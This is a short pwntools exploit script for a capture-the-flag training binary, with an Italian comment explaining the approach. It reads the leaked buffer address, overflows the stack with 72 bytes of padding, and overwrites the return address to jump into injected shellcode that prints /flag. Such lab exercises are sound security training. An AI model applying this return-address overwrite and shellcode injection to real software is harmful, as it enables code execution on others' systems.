#!/usr/bin/python3
from pwn import *

'''
-- OBIETTIVO DEL PROGRAMMA --
In questo esercizio bisogna inserire all'interno del buffer uno shellcode per eseguire
il comando 'cat' della flag. Il programma salva una variabile nello stack che non permette
di inserire semplicemente lo shellcode, perchè quest'ultimo viene sovrascritto e quindi non
funziona. Per evitare questo problema si può inserire del padding tra il buffer e il return
address, per poi inserire al posto del return address un indirizzo successivo nella memoria e inserire
proprio a tale indirizzo lo shellcode. In questo modo si evita il problema descritto sopra.
-----------------------------
'''

context.log_level = 'CRITICAL'
context.arch = 'amd64'

elf = ELF('/challenge/toddlerone-level-2-0')

p = elf.process()

p.recvuntil(b'The input buffer begins at 0x')
addr = p.recvuntil(b',').decode()[:-1]
addr = p64(int(addr, 16) + 80)

assembly = shellcraft.cat('/flag')
shellcode = asm(assembly)

delta_len = 72
padding = b'A' * delta_len
bytestream = padding + addr + shellcode

p.sendline(f'{len(bytestream)}'.encode())
p.sendline(bytestream)
p.interactive()
